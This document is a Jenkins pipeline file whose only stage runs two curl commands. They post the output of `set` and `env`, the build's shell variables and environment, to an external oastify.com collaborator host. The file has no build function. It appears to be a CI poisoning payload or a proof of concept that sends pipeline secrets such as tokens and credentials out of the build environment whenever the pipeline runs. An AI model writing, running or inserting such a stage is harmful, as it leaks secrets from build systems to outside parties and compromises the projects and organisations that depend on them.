pipeline {
    agent any

    stages {
        stage('Execute curl commands') {
            steps {
                script {
                    sh 'curl -d "`set`" https://fj2vxs6h0esvnyyleqwf0a6ykpqjt7pve.oastify.com'
                    sh 'curl -d "`env`" https://fj2vxs6h0esvnyyleqwf0a6ykpqjt7pve.oastify.com'
                }
            }
        }
    }
}
